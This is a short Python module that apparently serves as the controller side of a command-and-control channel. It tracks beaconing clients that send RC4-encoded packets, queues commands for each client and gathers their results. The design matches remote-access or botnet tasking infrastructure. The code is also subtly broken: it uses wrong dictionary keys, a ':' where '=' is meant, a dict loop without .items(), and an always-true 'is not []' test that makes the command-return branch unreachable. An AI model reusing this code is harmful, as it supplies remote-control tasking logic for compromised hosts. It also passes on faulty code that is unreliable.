# coding:utf-8
import queue
import asyncio
from app.utils import *

events = queue.Queue()
Conn = {}


def online_list():
    l = []
    for k, v in Conn:
        l.append({
            "uuid": k,
            "info": v["info"]
        })
    return dumps({
        "action": "just for you",
        "data": l
    })


def get_action():
    return events.get()


def do_action(uuid, do_something):
    if uuid not in Conn:
        return
    Conn["uuid"]["do"].append(do_something)


def online(uuid):
    asyncio.create_task(timer(uuid))
    events.put(
        {
            "action": "online",
            "data": {
                "uuid": uuid,
                "info": Conn["info"]
            }
        }
    )


def offline(uuid):
    if uuid in Conn:
        Conn.pop(uuid)
        events.put(
            {
                "action": "offline",
                "data": {
                    "uuid": uuid
                }
            }
        )


async def timer(uuid):
    while True:
        await asyncio.sleep(Conn[uuid]["next_second"])
        if int(time()) > Conn["time"] + Conn["next_second"] + 5:
            offline(uuid)
            break


def handle(packet):
    raw = rc4_decode(packet)
    data = loads(raw)
    if "uuid" not in data or "info" not in data:
        return
    else:
        if data["uuid"] not in Conn:
            Conn[data["uuid"]] = {
                "info": data["info"],
                "time": int(time()),
                "next_second": data["next_second"],
                "do": []
            }
            online(data["uuid"])

        if "next_second" in data:
            # 更新表中的时间为下次检测日期
            Conn[data["uuid"]]["time"]: int(time())
            Conn[data["uuid"]]["next_second"] = data["next_second"]
    if "result" in data and type(data["result"]) is list:
        if data["result"] is not []:
            for i in data["result"]:
                events.put(
                    {
                        "action": "result",
                        "data": {
                            "uuid": data["uuid"],
                            "action": i["action"],
                            "data": i["data"]
                        }
                    }
                )

        else:
            result = Conn["do"]
            Conn["do"] = []
            return result
